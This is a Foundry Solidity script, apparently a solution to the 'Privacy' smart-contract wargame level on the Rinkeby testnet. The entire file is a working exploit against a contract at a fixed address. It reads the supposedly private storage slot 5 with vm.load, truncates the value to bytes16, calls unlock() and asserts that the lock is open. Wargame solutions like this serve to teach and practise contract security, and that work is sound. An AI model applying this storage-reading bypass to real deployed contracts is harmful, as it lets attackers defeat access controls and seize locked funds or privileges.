// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { Privacy } from "src/Privacy/Privacy.sol";

import { toBytes } from "src/utils/toBytes.sol";
import { bytes32ToString } from "src/utils/toString.sol";

contract PrivacyAttackScript is Script {

    // affected contract: https://rinkeby.etherscan.io/address/0x9513c6F862FBdcA30aE7779AD33FE05136b05872

    function run() public {
        address privacyInstance = address(0x9513c6F862FBdcA30aE7779AD33FE05136b05872);
        bytes32 storageData;

        vm.startBroadcast();
            storageData = vm.load(privacyInstance, bytes32(toBytes(5)));
            Privacy(privacyInstance).unlock(bytes16(storageData));
            bool success = Privacy(privacyInstance).locked() == false;
            assert(success);
        vm.stopBroadcast();
    }


}